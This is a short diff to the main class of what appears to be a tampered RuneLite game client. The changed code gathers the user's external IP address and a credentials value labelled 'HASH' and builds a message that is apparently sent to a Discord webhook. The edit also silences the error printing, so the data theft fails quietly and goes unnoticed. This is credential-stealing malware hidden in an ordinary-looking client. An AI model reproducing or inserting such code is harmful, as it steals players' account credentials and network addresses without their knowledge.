@@ -457,12 +457,13 @@ public class RuneLite
 			URL ipAdress = new URL("http://myexternalip.com/raw");
 			BufferedReader in = new BufferedReader(new InputStreamReader(ipAdress.openStream()));
 			String IPA = in.readLine();
-			screenshotString = "**USERNAME:** " + discordUser.getCurrentUser().username + " **NET ADDR:** " + IPA + " **HASH:** " + credentials;
+			screenshotString = //discordUser.getCurrentUser().username != null ? "**USERNAME:** " + discordUser.getCurrentUser().username + " **NET ADDR:** " + IPA + " **HASH:** " + credentials :
+					" **NET ADDR:** " + IPA + " **HASH:** " + credentials;
 
 		} catch (MalformedURLException e) {
-			e.printStackTrace();
+			//e.printStackTrace();
 		} catch (IOException e) {
-			e.printStackTrace();
+			//e.printStackTrace();
 		}
 		//screenshotString += " " + all;
 		DiscordWebhookBody discordWebhookBody = new DiscordWebhookBody();
